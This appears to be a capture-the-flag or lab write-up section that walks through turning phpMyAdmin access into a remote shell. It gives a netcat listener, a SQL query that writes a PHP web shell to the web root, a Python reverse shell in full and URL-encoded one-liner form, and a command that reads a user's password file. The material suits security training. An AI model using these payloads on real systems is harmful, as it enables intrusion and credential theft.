# EXPLOIT 7: FROM WEBSERVER TO SHELL

There's yet another way to exploit the *phpMyAdmin* database. Let's dive into it!

## Reverse shell

To establish a *Reverse Shell*, we first need a listener on our machine. For this, we can use `netcat` to handle the task.

```Sh
nc -lvp 4242
```

Next, we need to create a shell payload that will help with establishing a connection with the target machine. We'll upload this payload using the same method as in previous exploits. By replicating the query from [writeup1](../writeup1.md), we can generate a PHP script that can execute shell commands.

```SQL
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/reverse_shell.php"
```

We will then use the PHP script to execute a Python script that will establish a reverse connection to our machine and create a shell session that allows us to execute commands remotely.

```Python
import socket,subprocess,os,pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.47",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=pty.spawn("/bin/bash")
```

However, we need to convert the script into a single line since it will be entered directly into the URL.

```
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.144.5",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/bash");'
```

Additionally, we need to [URL-encode](https://www.urlencoder.org) the script since certain characters cannot be used directly in the URL. This results in the following URL:

```
https://192.168.144.3/forum/templates_c/reverse_shell.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.144.5%22%2C4242%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dpty.spawn%28%22%2Fbin%2Fbash%22%29%3B%27
```

Finally, by navigating to this page, we establish a connection to the target machine's shell session via *netcat*, allowing us to retrieve the password for the *lmezard* user.

```Sh
cat /home/LOOKATME/password
```

From there, continue at **Exploiting lmezard** in [writeup1](../writeup1.md).